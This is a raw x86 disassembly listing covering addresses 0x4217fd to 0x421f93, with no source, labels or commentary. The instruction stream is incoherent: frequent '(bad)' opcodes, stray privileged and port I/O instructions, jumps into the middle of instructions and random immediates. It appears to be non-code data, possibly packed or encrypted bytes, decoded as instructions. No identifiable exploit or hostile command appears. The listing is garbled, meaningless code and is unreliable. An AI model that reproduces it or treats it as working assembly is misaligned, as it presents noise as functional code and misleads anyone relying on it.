  4217fd:	or     eax,0xa4009788
  421802:	adc    DWORD PTR ds:0x3d6f66c0,0xaa27eb50
  42180c:	loop   0x421837
  42180e:	mov    ecx,0x3d5e232c
  421813:	fcomp  DWORD PTR [edx]
  421815:	mov    eax,ds:0x8d52cf56
  42181a:	and    DWORD PTR [edx+0x2674228e],eax
  421820:	push   ebp
  421821:	inc    ebp
  421822:	pop    ecx
  421823:	fcomip st,st(3)
  421825:	xchg   ebp,eax
  421826:	pop    edx
  421827:	gs aam 0xc5
  42182a:	rol    BYTE PTR [ecx-0x549fc431],cl
  421830:	or     al,0x49
  421832:	lahf   
  421833:	les    ebp,FWORD PTR [esi-0x77]
  421836:	and    edx,DWORD PTR [ecx+0x20234927]
  42183c:	int    0x20
  42183e:	scas   eax,DWORD PTR es:[edi]
  42183f:	xlat   BYTE PTR ds:[ebx]
  421840:	ret    
  421841:	pop    esp
  421842:	fistp  QWORD PTR [edi]
  421844:	fucomp st(2)
  421846:	outs   dx,BYTE PTR ds:[esi]
  421847:	pop    esp
  421848:	jo     0x4217f5
  42184a:	xor    bh,BYTE PTR [edx]
  42184c:	mov    eax,ds:0x3248b621
  421851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421852:	sbb    ebp,DWORD PTR [edx+esi*8-0x1]
  421856:	stos   DWORD PTR es:[edi],eax
  421857:	retf   
  421858:	add    ebx,DWORD PTR [edx+0x34]
  42185b:	test   eax,0xdced56c3
  421860:	mov    cl,0x2c
  421862:	sub    bh,BYTE PTR [ecx]
  421864:	add    BYTE PTR ss:[eax],al
	...
  42186f:	add    BYTE PTR [eax],al
  421871:	ds inc esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    DWORD PTR [ecx+0x7c],eax
  42187f:	call   0x1d3fdf1
  421884:	add    BYTE PTR [ebx+eax*1+0x12e00000],ch
  42188b:	dec    eax
  42188c:	je     0x42188e
  42188e:	cdq    
  42188f:	das    
  421890:	xor    edi,DWORD PTR [eax+0x3b635038]
  421896:	(bad)  
  421897:	shl    BYTE PTR [eax-0x1ffd2e72],0x9d
  42189e:	in     al,0xe5
  4218a0:	or     al,0xe2
  4218a2:	sub    eax,0xa0fe1d87
  4218a7:	add    dl,BYTE PTR [eax+0x71]
  4218aa:	std    
  4218ab:	push   edx
  4218ac:	std    
  4218ad:	inc    eax
  4218ae:	jmp    DWORD PTR [ebx+0x2d]
  4218b1:	jl     0x4218d4
  4218b3:	xor    ah,ah
  4218b5:	jo     0x4218a0
  4218b7:	jbe    0x42183c
  4218b9:	call   0x6e6a:0xe07da6c9
  4218c0:	loope  0x42185c
  4218c2:	(bad)  
  4218c3:	pop    ss
  4218c4:	popf   
  4218c5:	test   eax,0x3122a8ee
  4218ca:	je     0x421883
  4218cc:	lea    edx,[eax+0x37]
  4218cf:	gs loopne 0x42189a
  4218d2:	and    bl,ah
  4218d4:	jmp    0x353a:0x3c6eea5a
  4218db:	mov    al,0x72
  4218dd:	inc    esi
  4218de:	push   ss
  4218df:	sbb    DWORD PTR [esi],esi
  4218e1:	mov    ds:0xaf35cd2f,al
  4218e6:	mov    edx,DWORD PTR [edi-0x8746f42]
  4218ec:	out    0xea,al
  4218ee:	cmp    al,0xee
  4218f0:	(bad)  
  4218f2:	test   ebx,esi
  4218f4:	cdq    
  4218f5:	push   es
  4218f6:	stos   BYTE PTR es:[edi],al
  4218f7:	pop    eax
  4218f8:	mov    eax,esi
  4218fa:	push   eax
  4218fb:	hlt    
  4218fc:	out    0x5e,eax
  4218fe:	xchg   DWORD PTR [ecx-0x47c5278d],ecx
  421904:	into   
  421905:	daa    
  421906:	mov    esp,0x269d479c
  42190b:	or     edi,DWORD PTR [ecx+ebp*1+0x0]
  42190f:	enter  0xf9ee,0x22
  421913:	outs   dx,DWORD PTR cs:[esi]
  421915:	iret   
  421916:	(bad)  
  421917:	jo     0x421936
  421919:	inc    eax
  42191a:	xor    edx,DWORD PTR [edi+0xa04edc1]
  421920:	xlat   BYTE PTR ds:[ebx]
  421921:	ds mov eax,eax
  421924:	inc    esp
  421925:	scas   al,BYTE PTR es:[edi]
  421926:	pop    esi
  421927:	in     al,dx
  421928:	adc    ecx,DWORD PTR [ebp+edi*1+0x58]
  42192c:	cmp    edi,esp
  42192e:	gs inc ebp
  421930:	mov    eax,0x94cafc00
  421935:	outs   dx,DWORD PTR ds:[esi]
  421936:	fs push eax
  421938:	shr    DWORD PTR [esi+0x340b87a],1
  42193e:	fwait
  42193f:	jo     0x421993
  421941:	dec    ebp
  421942:	repz push esi
  421944:	ret    0xb65
  421947:	jns    0x421915
  421949:	dec    edi
  42194a:	test   al,0x59
  42194c:	mul    DWORD PTR [ebx+0xe]
  42194f:	push   0xffffffb4
  421951:	shl    DWORD PTR [edx-0xa],1
  421954:	ins    DWORD PTR es:[edi],dx
  421955:	mov    esi,0xbde02d6b
  42195a:	push   0xfffffffa
  42195c:	rcr    cl,0xd1
  42195f:	jecxz  0x42192d
  421961:	jecxz  0x42194d
  421963:	mov    al,ds:0xba29732e
  421968:	mov    ds:0xe59184f7,al
  42196d:	(bad)  
  42196e:	(bad)  [edi+0x603724ad]
  421974:	mov    cl,0xd8
  421976:	ret    
  421977:	nop
  421978:	jb     0x4219ac
  42197a:	dec    ebp
  42197b:	xchg   edi,eax
  42197c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42197d:	int3   
  42197e:	push   eax
  42197f:	inc    esi
  421980:	fnstsw WORD PTR [eax+eiz*1+0x35]
  421984:	stos   BYTE PTR es:[edi],al
  421985:	fisubr WORD PTR [ecx]
  421987:	adc    BYTE PTR [ebp+0x61f447bb],ah
  42198d:	daa    
  42198e:	icebp  
  42198f:	xor    cl,BYTE PTR [edx*8+0x6d8f8a30]
  421996:	test   eax,0x4ae3d02
  42199b:	dec    ecx
  42199c:	mov    ah,0xa6
  42199e:	scas   al,BYTE PTR es:[edi]
  42199f:	cmp    eax,0xd51c9443
  4219a4:	push   ss
  4219a5:	and    bl,BYTE PTR [ebx+0x4d5b6b3d]
  4219ab:	mov    ds:0xe51a6448,eax
  4219b0:	xchg   ecx,eax
  4219b1:	and    bl,dh
  4219b3:	add    al,0xcc
  4219b5:	(bad)  
  4219b6:	lock xchg ebp,eax
  4219b8:	data16 clc 
  4219ba:	mov    esp,fs
  4219bc:	mov    ds:0x75946dcc,al
  4219c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219c2:	int3   
  4219c3:	add    DWORD PTR [esi],edi
  4219c5:	mov    esi,0x3e76f081
  4219ca:	push   edi
  4219cb:	into   
  4219cc:	sbb    bl,BYTE PTR [esi]
  4219ce:	adc    DWORD PTR [edi+0x431eee2f],edi
  4219d4:	cmp    BYTE PTR [esi-0x3c],ch
  4219d7:	bound  ecx,QWORD PTR [ebx+0x351bedad]
  4219dd:	and    dl,ch
  4219df:	push   ds
  4219e0:	rol    BYTE PTR [edx-0x68],0x3c
  4219e4:	cwde   
  4219e5:	xchg   esp,eax
  4219e6:	xchg   edx,eax
  4219e7:	or     esp,DWORD PTR [ebp+0x34]
  4219ea:	cld    
  4219eb:	stos   DWORD PTR es:[edi],eax
  4219ec:	fistp  WORD PTR [ecx+0x234b7ebe]
  4219f2:	imul   ecx,DWORD PTR ds:[edi-0x252842c5],0xe3ca2341
  4219fd:	mov    edx,0x357a7416
  421a02:	aaa    
  421a03:	loopne 0x421a3f
  421a05:	dec    ebp
  421a06:	rol    BYTE PTR [esi-0x68ce2aec],0x79
  421a0d:	mov    ebp,0x6f2e8b27
  421a12:	sbb    eax,0x2a007d74
  421a17:	xchg   esp,eax
  421a18:	js     0x421a7c
  421a1a:	xchg   DWORD PTR [esi+0x2042009d],ecx
  421a20:	push   eax
  421a21:	sub    BYTE PTR [ebx-0x80],0x45
  421a25:	pop    ebp
  421a26:	push   0x5b
  421a28:	int3   
  421a29:	and    edi,esp
  421a2b:	xor    ch,ah
  421a2d:	jp     0x421a09
  421a2f:	in     eax,0x16
  421a31:	gs jbe 0x421a76
  421a34:	xchg   cl,bl
  421a36:	or     BYTE PTR [esi+esi*2-0x751704a3],0xbf
  421a3e:	adc    bh,dl
  421a40:	je     0x421aab
  421a42:	fiadd  DWORD PTR [esi-0x4c]
  421a45:	imul   ebx,DWORD PTR [ecx],0xffffffed
  421a48:	inc    ecx
  421a49:	push   esp
  421a4a:	pusha  
  421a4b:	cmp    eax,0x7089b51
  421a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a51:	mov    al,0xf0
  421a53:	jge    0x421ac0
  421a55:	daa    
  421a56:	and    eax,0xb4108ccb
  421a5b:	scas   eax,DWORD PTR es:[edi]
  421a5c:	hlt    
  421a5d:	in     eax,0xc
  421a5f:	fcom   st(4)
  421a61:	icebp  
  421a62:	enter  0x1500,0x39
  421a66:	je     0x421ad5
  421a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a69:	adc    ah,BYTE PTR [ecx]
  421a6b:	mov    ah,0x39
  421a6d:	dec    ebx
  421a6e:	(bad)  
  421a6f:	fnsave [ecx]
  421a71:	gs leave 
  421a73:	push   0x5d
  421a75:	sub    eax,0xb72ebd0b
  421a7a:	jmp    0x421a6a
  421a7c:	arpl   WORD PTR [ebp+0x7f00ca7e],si
  421a82:	imul   cx,dx,0x6f2
  421a87:	in     eax,dx
  421a88:	cmc    
  421a89:	xchg   ecx,eax
  421a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8b:	mov    esi,0xa1c15ff7
  421a90:	adc    eax,0xabb9cdc5
  421a95:	mov    ds:0x9ad2eb33,eax
  421a9a:	xchg   edi,eax
  421a9b:	and    ah,bh
  421a9d:	sbb    DWORD PTR [edx-0x51],edi
  421aa0:	std    
  421aa1:	cmp    esi,ebx
  421aa3:	pop    esi
  421aa4:	data16 jnp 0x421a75
  421aa7:	and    al,0x76
  421aa9:	iret   
  421aaa:	lods   al,BYTE PTR ds:[esi]
  421aab:	sbb    eax,DWORD PTR [edx+0x668667c5]
  421ab1:	aas    
  421ab2:	test   DWORD PTR [edi+ebp*2+0x2dcf5916],ebx
  421ab9:	daa    
  421aba:	popa   
  421abb:	dec    ebx
  421abc:	jb     0x421a87
  421abe:	(bad)  
  421ac0:	xchg   esp,eax
  421ac1:	shl    BYTE PTR [eax],1
  421ac3:	dec    esi
  421ac4:	aad    0x81
  421ac6:	inc    edi
  421ac7:	adc    DWORD PTR [esi],esi
  421ac9:	push   0x46cb0e12
  421ace:	mov    esi,DWORD PTR [ebp-0x5bdd17ed]
  421ad4:	pop    edx
  421ad5:	lea    edx,[ebx]
  421ad7:	retf   
  421ad8:	pop    es
  421ad9:	dec    edx
  421ada:	xchg   edx,eax
  421adb:	mov    ebx,0x70c8851
  421ae0:	cld    
  421ae1:	std    
  421ae2:	and    DWORD PTR [ebx],ebp
  421ae4:	aad    0x3c
  421ae6:	(bad)  
  421ae7:	stos   BYTE PTR es:[edi],al
  421ae8:	ror    ebp,1
  421aea:	sbb    BYTE PTR [ebx],al
  421aec:	sti    
  421aed:	sbb    esp,DWORD PTR [bx+di+0x35]
  421af1:	cmp    ebp,edi
  421af3:	mov    bl,0x96
  421af5:	call   FWORD PTR [bp+0x24]
  421af9:	jno    0x421b73
  421afb:	test   DWORD PTR [bp+si],ebp
  421afe:	sbb    al,0xeb
  421b00:	fmul   DWORD PTR [eax-0x37]
  421b03:	jecxz  0x421b46
  421b05:	outs   dx,DWORD PTR ds:[esi]
  421b06:	aad    0x4c
  421b08:	aaa    
  421b09:	(bad)  [edi]
  421b0b:	and    esi,esp
  421b0d:	test   al,0x1e
  421b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b10:	in     al,dx
  421b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b12:	mov    edx,DWORD PTR [ebp-0xbf051ce]
  421b18:	push   esp
  421b19:	pop    eax
  421b1a:	jo     0x421b1e
  421b1c:	inc    edx
  421b1d:	inc    ecx
  421b1e:	xlat   BYTE PTR ds:[ebx]
  421b1f:	xchg   ecx,eax
  421b20:	dec    esi
  421b21:	loopne 0x421ad4
  421b23:	or     al,0xd1
  421b25:	xor    esp,DWORD PTR [ebx+eiz*8-0x499545b1]
  421b2c:	out    dx,eax
  421b2d:	inc    edx
  421b2e:	test   esp,0x2df46c53
  421b34:	addr16 inc eax
  421b37:	inc    esp
  421b38:	rcr    esp,0x48
  421b3b:	sub    eax,0x1f71af8d
  421b40:	lods   eax,DWORD PTR ds:[esi]
  421b41:	add    eax,0xa26765ce
  421b46:	jmp    0x421ae3
  421b48:	icebp  
  421b49:	clc    
  421b4a:	pop    eax
  421b4b:	xor    al,0xb2
  421b4d:	mov    al,0xb8
  421b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b50:	cmc    
  421b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b52:	inc    ebp
  421b53:	neg    BYTE PTR [ebx]
  421b55:	clc    
  421b56:	push   eax
  421b57:	mov    eax,es:0x3335be03
  421b5d:	loop   0x421b97
  421b5f:	repnz or DWORD PTR [eax+0x4f74c399],edi
  421b66:	popa   
  421b67:	loope  0x421b65
  421b69:	xchg   esi,eax
  421b6a:	and    BYTE PTR [esi],ch
  421b6c:	in     al,dx
  421b6d:	cmp    al,0xbd
  421b6f:	jecxz  0x421bd3
  421b71:	inc    eax
  421b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b73:	jnp    0x421b14
  421b75:	loope  0x421b7f
  421b77:	pushf  
  421b78:	hlt    
  421b79:	or     esp,ecx
  421b7b:	ins    BYTE PTR es:[edi],dx
  421b7c:	add    al,0xe8
  421b7e:	scas   eax,DWORD PTR es:[edi]
  421b7f:	fidivr WORD PTR [edi-0x5302b659]
  421b85:	ficomp DWORD PTR [eax+ebx*8]
  421b88:	jg     0x421b1c
  421b8a:	mov    BYTE PTR [ecx],cl
  421b8c:	push   ebp
  421b8d:	dec    ebx
  421b8e:	or     eax,0xc8e9cb29
  421b93:	jb     0x421b69
  421b95:	(bad)  
  421b96:	sub    dl,BYTE PTR [edi]
  421b98:	mov    ebp,0x35532e67
  421b9d:	outs   dx,BYTE PTR ds:[esi]
  421b9e:	(bad)
  421ba1:	cli    
  421ba2:	stos   BYTE PTR es:[edi],al
  421ba3:	jge    0x421b39
  421ba5:	lods   eax,DWORD PTR ds:[esi]
  421ba6:	or     DWORD PTR [edx+0x625268ec],ecx
  421bac:	aad    0xe9
  421bae:	jns    0x421bbc
  421bb0:	jnp    0x421b94
  421bb2:	mov    ch,0xd2
  421bb4:	cmp    eax,0xd0778e83
  421bb9:	add    BYTE PTR [ecx+0x77],al
  421bbc:	xchg   edi,eax
  421bbd:	and    dl,BYTE PTR [eax]
  421bbf:	sub    ah,bh
  421bc1:	data16 lods al,BYTE PTR ds:[esi]
  421bc3:	jge    0x421b54
  421bc5:	jns    0x421bb3
  421bc7:	fbstp  TBYTE PTR [edi-0x44]
  421bca:	xor    edx,ecx
  421bcc:	push   ss
  421bcd:	mov    edx,0x950fc738
  421bd2:	and    al,0xa4
  421bd4:	shl    BYTE PTR [ecx],1
  421bd6:	cdq    
  421bd7:	or     bl,dl
  421bd9:	add    edi,esp
  421bdb:	mov    dh,0x52
  421bdd:	aad    0x72
  421bdf:	jne    0x421b6a
  421be1:	sub    DWORD PTR [ebx+0x48304b8c],0x6a0e6530
  421beb:	add    ebp,edx
  421bed:	or     al,0x4
  421bef:	dec    ebp
  421bf0:	xor    BYTE PTR [esi+0xb],cl
  421bf3:	mov    eax,0xb6cdcaa5
  421bf8:	add    DWORD PTR [esi],eax
  421bfa:	or     ebx,DWORD PTR [eax+0x69]
  421bfd:	sar    esi,cl
  421bff:	aaa    
  421c00:	loope  0x421bfa
  421c02:	ret    
  421c03:	int3   
  421c04:	sbb    dh,BYTE PTR [edx+0x24813bed]
  421c0a:	ficomp WORD PTR [edi]
  421c0c:	adc    al,bl
  421c0e:	jo     0x421c2c
  421c10:	xchg   ecx,eax
  421c11:	and    bl,BYTE PTR [edx+0x1151ca4a]
  421c17:	push   eax
  421c18:	arpl   WORD PTR [edi-0x3e],dx
  421c1b:	shr    edi,cl
  421c1d:	and    DWORD PTR [ebp-0x62fd89f5],edx
  421c23:	add    DWORD PTR [ebx],eax
  421c25:	ins    BYTE PTR es:[edi],dx
  421c26:	pop    esp
  421c27:	cdq    
  421c28:	rcl    DWORD PTR [ecx+0x73],0xac
  421c2c:	push   eax
  421c2d:	inc    esi
  421c2e:	xor    al,0xad
  421c30:	stc    
  421c31:	in     al,dx
  421c32:	cli    
  421c33:	jecxz  0x421c17
	...
  421c41:	or     al,0xc2
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0xf7971a56
  421c4e:	shl    DWORD PTR [ebp+0x1959160],cl
  421c54:	add    BYTE PTR [ebx+eax*1-0x6a1f0000],ch
  421c5b:	push   eax
  421c5c:	add    bh,BYTE PTR [eax-0x57bab694]
  421c62:	dec    ebx
  421c63:	add    cl,al
  421c65:	pop    esp
  421c66:	fldcw  WORD PTR [ebx+0x243bcc08]
  421c6c:	test   eax,0x3b4e2954
  421c71:	mov    eax,ds:0xb2d015ca
  421c76:	or     ch,BYTE PTR [edi-0x21]
  421c79:	lods   al,BYTE PTR ds:[esi]
  421c7a:	dec    esi
  421c7b:	cmp    bl,BYTE PTR [ebx+0x3]
  421c7e:	in     al,dx
  421c7f:	sbb    edi,eax
  421c81:	repnz fmul DWORD PTR [eax]
  421c84:	dec    edi
  421c85:	pop    ds
  421c86:	jg     0x421c88
  421c88:	cmp    edx,DWORD PTR [ebx+0x17]
  421c8b:	clc    
  421c8c:	push   edx
  421c8d:	ret    0x3951
  421c90:	sbb    eax,0xfa28dad8
  421c95:	clc    
  421c96:	es leave 
  421c98:	push   0xffffffb5
  421c9a:	adc    eax,0x9707d521
  421c9f:	repz iret 
  421ca1:	sub    DWORD PTR [edi+0x5d],esp
  421ca4:	sbb    BYTE PTR [ebp-0x74],ch
  421ca7:	pop    eax
  421ca8:	push   ss
  421ca9:	and    al,0x8
  421cab:	fyl2xp1 
  421cad:	shr    BYTE PTR ds:0x2323a0cf,1
  421cb3:	fdiv   DWORD PTR [eax-0xfce1338]
  421cb9:	stc    
  421cba:	aam    0xb5
  421cbc:	xchg   ecx,eax
  421cbd:	out    0x0,eax
  421cbf:	call   0xf3cc7b08
  421cc4:	ins    DWORD PTR es:[edi],dx
  421cc5:	sub    edx,DWORD PTR ds:0x512b951
  421ccb:	pop    edi
  421ccd:	clc    
  421cce:	push   es
  421ccf:	(bad)  
  421cd0:	clc    
  421cd1:	dec    edx
  421cd2:	fdiv   st(7),st
  421cd4:	cmp    bh,BYTE PTR [ebp-0x12efdd6d]
  421cda:	dec    esp
  421cdb:	push   esp
  421cdc:	(bad)  
  421cdd:	mov    ah,dl
  421cdf:	inc    ecx
  421ce0:	lods   eax,DWORD PTR ds:[esi]
  421ce1:	cmp    cl,bh
  421ce3:	(bad)  
  421ce4:	leave  
  421ce5:	push   esi
  421ce6:	rcl    BYTE PTR [ebp+0x49],1
  421ce9:	cmp    DWORD PTR [ebp+0x5661333e],ecx
  421cef:	mov    edx,0xb2ea5a7e
  421cf4:	or     dl,ah
  421cf6:	push   ebp
  421cf7:	ds pop edx
  421cf9:	sbb    edi,DWORD PTR [ebx]
  421cfb:	mov    ss,WORD PTR [edx-0x39]
  421cfe:	cmp    esi,DWORD PTR [edx+0x71a46dee]
  421d04:	mov    ds:0xb0db1287,al
  421d09:	sti    
  421d0a:	hlt    
  421d0b:	add    eax,0x61e177a3
  421d10:	cwde   
  421d11:	loop   0x421d57
  421d13:	inc    esp
  421d14:	mov    ch,0xf9
  421d16:	pusha  
  421d17:	push   esi
  421d18:	mov    dh,0x3a
  421d1a:	(bad)  
  421d1b:	gs (bad) 
  421d1d:	xor    DWORD PTR [ecx],ebx
  421d1f:	or     bh,ch
  421d21:	dec    eax
  421d22:	xchg   esi,eax
  421d23:	ror    dh,0x8c
  421d26:	mov    ds:0xb913cf20,al
  421d2b:	xor    al,BYTE PTR [eax+0x22b012da]
  421d31:	inc    esi
  421d32:	popa   
  421d33:	xchg   edx,eax
  421d34:	or     dl,BYTE PTR ds:0x28526d4c
  421d3a:	jmp    DWORD PTR ds:0x26dbcf8b
  421d40:	dec    ecx
  421d41:	inc    BYTE PTR [edi]
  421d43:	into   
  421d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d45:	add    BYTE PTR [ebp+edi*2-0x3a],0x1b
  421d4a:	outs   dx,DWORD PTR ds:[esi]
  421d4b:	ja     0x421d69
  421d4d:	xor    al,0x6d
  421d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d50:	adc    DWORD PTR [edi+edx*8-0x63d7e531],eax
  421d57:	ret    0xfd4c
  421d5a:	push   cs
  421d5b:	je     0x421dbc
  421d5d:	xor    al,dh
  421d5f:	loopne 0x421dc9
  421d61:	dec    esi
  421d62:	loope  0x421cf4
  421d64:	bound  esi,QWORD PTR [ebx+0x280bec95]
  421d6a:	push   esp
  421d6b:	mov    ah,ah
  421d6d:	test   BYTE PTR [eax-0x2a],dl
  421d70:	pop    ds
  421d71:	mov    esp,0xec70cd92
  421d76:	xchg   ebx,eax
  421d77:	jmp    0x457893ac
  421d7c:	mov    dl,0x20
  421d7e:	(bad)
  421d83:	sub    ch,dh
  421d85:	loopne 0x421d97
  421d87:	jbe    0x421d5a
  421d89:	fdivr  DWORD PTR [ebp-0x39df7e72]
  421d8f:	push   cs
  421d90:	sahf   
  421d91:	push   edi
  421d92:	mov    eax,ds:0x262b5536
  421d97:	jns    0x421e18
  421d99:	xor    al,0x67
  421d9b:	adc    bl,dh
  421d9d:	not    dh
  421d9f:	popa   
  421da0:	scas   al,BYTE PTR es:[edi]
  421da1:	sbb    DWORD PTR ds:[ebx+0x3be2c9e8],esi
  421da8:	fwait
  421da9:	sbb    al,0xd6
  421dab:	mov    eax,ds:0xf3fa7b67
  421db0:	inc    edi
  421db1:	in     al,dx
  421db2:	scas   eax,DWORD PTR es:[edi]
  421db3:	push   edx
  421db4:	mov    BYTE PTR [ecx-0x1fe91b3f],dl
  421dba:	sub    BYTE PTR [edi+0x22426366],bh
  421dc0:	jb     0x421da2
  421dc2:	icebp  
  421dc3:	int3   
  421dc4:	mov    ds:0xc5611f9,eax
  421dc9:	test   ecx,esi
  421dcb:	imul   ebx,DWORD PTR [ecx],0x3a5c6593
  421dd1:	inc    ecx
  421dd2:	std    
  421dd3:	mov    WORD PTR [edx-0xf],cs
  421dd6:	mov    ecx,0xe86a2e42
  421ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ddc:	arpl   WORD PTR ds:0x161fbd8d,bp
  421de2:	fwait
  421de3:	push   0x5a90d35d
  421de8:	mov    al,ds:0x27b8ea4b
  421ded:	aad    0x85
  421def:	and    esi,DWORD PTR cs:[edx+0x74]
  421df3:	jb     0x421e25
  421df5:	push   edi
  421df6:	out    0x71,al
  421df8:	ja     0x421dac
  421dfa:	inc    esi
  421dfb:	sahf   
  421dfc:	ror    BYTE PTR [ecx],1
  421dfe:	mov    esi,0xba31f26c
  421e03:	pop    ecx
  421e04:	sbb    edi,DWORD PTR [ebx]
  421e06:	(bad)  
  421e07:	cmp    dl,BYTE PTR [edi+0x274b4029]
  421e0d:	stos   BYTE PTR es:[edi],al
  421e0e:	and    BYTE PTR [ebx+eiz*4],dh
  421e11:	outs   dx,BYTE PTR ds:[esi]
  421e12:	sahf   
  421e13:	lods   eax,DWORD PTR ds:[esi]
  421e14:	lea    edx,[ecx+eax*1]
  421e17:	mov    ebx,0xf7fae5f1
  421e1c:	test   al,0x18
  421e1e:	mov    ecx,0x3e9a9feb
  421e23:	shr    DWORD PTR [ebx+0xb8876f7],cl
  421e29:	jae    0x421de7
  421e2b:	iret   
  421e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e2d:	add    BYTE PTR [edx+0x3f0e23e5],al
  421e33:	dec    esp
  421e34:	cmp    eax,0x7b0e7fc4
  421e39:	fwait
  421e3a:	lds    eax,FWORD PTR [edx+0x1e508542]
  421e40:	mov    DWORD PTR [esi+0x2d],edx
  421e43:	inc    ecx
  421e44:	xchg   esi,eax
  421e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e46:	aaa    
  421e47:	iret   
  421e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e49:	rcl    BYTE PTR [ebx+0x30],0x1c
  421e4d:	fcomp  QWORD PTR gs:[edi+edi*2+0x18d20a4]
  421e55:	xchg   edi,eax
  421e56:	iret   
  421e57:	push   esp
  421e58:	jns    0x421e56
  421e5a:	in     eax,dx
  421e5b:	jg     0x421ed6
  421e5d:	inc    esi
  421e5e:	cdq    
  421e5f:	push   ebx
  421e60:	jl     0x421def
  421e62:	rol    bh,0x57
  421e65:	arpl   WORD PTR [ecx+0x4046a81f],cx
  421e6b:	int3   
  421e6c:	shl    DWORD PTR [eax+0x61],0x1a
  421e70:	rcl    BYTE PTR [esi],0xf9
  421e73:	sub    dh,0xc1
  421e76:	test   al,0xfe
  421e78:	bound  esp,QWORD PTR [esi+0x572383f6]
  421e7e:	data16 shr BYTE PTR [ebx-0xdde5160],1
  421e85:	jno    0x421e3f
  421e87:	stc    
  421e88:	pop    ebp
  421e89:	xchg   DWORD PTR [ebx+edi*1],edx
  421e8c:	enter  0xd899,0x98
  421e90:	add    al,BYTE PTR [esi]
  421e92:	sbb    eax,DWORD PTR [ecx+edi*8-0x772889ef]
  421e99:	(bad)  
  421e9a:	sub    al,0xd7
  421e9c:	mov    ds:0xeb7dcb26,eax
  421ea1:	in     al,0x76
  421ea3:	pop    ebp
  421ea4:	into   
  421ea5:	push   edx
  421ea6:	xor    dh,bh
  421ea8:	pop    ebx
  421ea9:	iret   
  421eaa:	(bad)  
  421eab:	out    dx,eax
  421eac:	or     dl,ah
  421eae:	dec    ebx
  421eaf:	xchg   ecx,eax
  421eb0:	lods   al,BYTE PTR ds:[esi]
  421eb1:	icebp  
  421eb2:	xor    BYTE PTR cs:[esi-0x1b],ah
  421eb6:	enter  0xd5fa,0x96
  421eba:	pop    es
  421ebb:	dec    ebp
  421ebc:	hlt    
  421ebd:	iret   
  421ebe:	mov    al,BYTE PTR [esi]
  421ec0:	jl     0x421e4d
  421ec2:	(bad)  
  421ec3:	out    0xcb,eax
  421ec5:	call   0x2e03d01b
  421eca:	sub    bl,bh
  421ecc:	cmp    dh,BYTE PTR [ebx]
  421ece:	pop    ebp
  421ecf:	pop    edx
  421ed0:	and    eax,0xf2d05a6e
  421ed5:	sub    eax,0x5b6f6eeb
  421eda:	dec    edi
  421edb:	js     0x421ef6
  421edd:	ficom  DWORD PTR [edx-0x44]
  421ee0:	arpl   WORD PTR [esi],sp
  421ee2:	jb     0x421e9e
  421ee4:	xor    ch,bh
  421ee6:	cmp    DWORD PTR [ecx],eax
  421ee8:	dec    ebp
  421ee9:	in     eax,0x91
  421eeb:	call   0x369d:0x539dbc4
  421ef2:	xor    cl,BYTE PTR [eax-0x6719bb76]
  421ef8:	and    al,0x62
  421efa:	push   esp
  421efb:	retf   0xeb07
  421efe:	jp     0x421f1f
  421f00:	mov    DWORD PTR [eax],esi
  421f02:	pop    eax
  421f03:	and    DWORD PTR [ebp+esi*8-0x5],ecx
  421f07:	sbb    ebx,DWORD PTR [ebx+esi*1+0x109a01e8]
  421f0e:	pop    es
  421f0f:	dec    edi
  421f10:	cmp    DWORD PTR [eax+0x36],ecx
  421f13:	bound  eax,QWORD PTR [esi-0x9cc2068]
  421f19:	mov    bh,0xe2
  421f1b:	mov    ds:0x56c0eeae,eax
  421f20:	inc    ebx
  421f21:	call   0x5387:0xdaa99c83
  421f28:	mov    ch,0xd8
  421f2a:	cdq    
  421f2b:	or     BYTE PTR [edi+ecx*4+0x41],bh
  421f2f:	jnp    0x421f03
  421f31:	jl     0x421f3a
  421f33:	cmp    DWORD PTR [edx-0x39],eax
  421f36:	int    0x65
  421f38:	shr    ch,0xe8
  421f3b:	popa   
  421f3c:	mov    esp,0x60c02849
  421f41:	cwde   
  421f42:	leave  
  421f43:	mov    ah,0xfc
  421f45:	jg     0x421f4d
  421f47:	outs   dx,BYTE PTR ds:[esi]
  421f48:	in     al,0xe7
  421f4a:	cdq    
  421f4b:	xor    eax,0xfd61cd88
  421f50:	sbb    eax,0xb89aa462
  421f55:	inc    esp
  421f56:	jge    0x421f6f
  421f58:	or     al,0x22
  421f5a:	sahf   
  421f5b:	xor    al,0xb6
  421f5d:	imul   eax,ebp,0x49
  421f60:	sbb    ecx,DWORD PTR [edx]
  421f62:	mov    cl,BYTE PTR [esi]
  421f64:	pop    eax
  421f65:	data16 sar BYTE PTR [eax-0x72],1
  421f69:	lods   eax,DWORD PTR ds:[esi]
  421f6a:	mov    edi,0x93b8c1cf
  421f6f:	and    esp,DWORD PTR [edi+0x7d92d276]
  421f75:	and    DWORD PTR [eax],0x1b63ff5a
  421f7b:	and    DWORD PTR [ebp+0x3],ecx
  421f7e:	dec    esp
  421f7f:	and    eax,0xe7863afe
  421f84:	mov    al,0xf6
  421f86:	arpl   WORD PTR [edi],bx
  421f88:	call   0x1311a572
  421f8d:	int3   
  421f8e:	dec    eax
  421f8f:	stos   BYTE PTR es:[edi],al
  421f90:	sti    
  421f91:	loope  0x421fd1
  421f93:	mov    dl,0xc3
